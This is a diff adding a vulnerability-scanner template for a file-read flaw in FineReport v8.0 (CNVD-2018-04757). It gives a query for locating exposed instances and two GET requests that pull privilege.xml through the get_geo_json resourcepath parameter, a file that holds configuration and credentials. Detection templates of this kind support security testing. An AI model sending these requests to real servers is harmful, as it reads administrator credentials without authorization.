@@ -1,0 +1,24 @@
+name: FineReport v8.0 Fileread CNVD-2018-04757
+manual: true
+query: app="fanruansem-FineReport"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"CDATA")
+  r1:
+    request:
+      method: GET
+      path: /ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"CDATA")
+expression: r0() || r1()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2018-04757
+  description: FineReport report software is an enterprise-level web report tool written
+    in pure Java, which integrates data display (report) and data entry (form) functions.
+  tags: fileread
